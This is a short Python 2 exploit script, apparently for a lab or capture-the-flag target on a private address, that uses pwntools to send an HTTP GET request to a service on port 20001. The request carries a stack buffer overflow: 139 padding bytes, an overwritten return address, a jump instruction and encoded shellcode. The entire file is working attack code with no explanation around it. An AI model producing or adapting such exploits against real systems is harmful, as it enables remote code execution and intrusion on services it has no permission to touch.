#!/usr/bin/python
from pwn import *
import struct

s = remote("192.168.135.133", 20001)

payload = ""
payload += "A"*139
payload += struct.pack("I", 0x08049f4f)
payload += "\xff\xe6"

shellcode =  ""
shellcode += "\xbf\x22\x29\x1e\x21\xd9\xee\xd9\x74\x24\xf4\x5a"
shellcode += "\x33\xc9\xb1\x12\x31\x7a\x12\x83\xea\xfc\x03\x58"
shellcode += "\x27\xfc\xd4\xad\xec\xf7\xf4\x9e\x51\xab\x90\x22"
shellcode += "\xdf\xaa\xd5\x44\x12\xac\x85\xd1\x1c\x92\x64\x61"
shellcode += "\x15\x94\x8f\x09\x66\xce\xf7\xc8\x0e\x0d\xf8\xdb"
shellcode += "\x92\x98\x19\x6b\x4c\xcb\x88\xd8\x22\xe8\xa3\x3f"
shellcode += "\x89\x6f\xe1\xd7\x7c\x5f\x75\x4f\xe9\xb0\x56\xed"
shellcode += "\x80\x47\x4b\xa3\x01\xd1\x6d\xf3\xad\x2c\xed"
s.sendline("GET {0} HTTP/1.1{1}".format(payload, shellcode))
print s.recvall()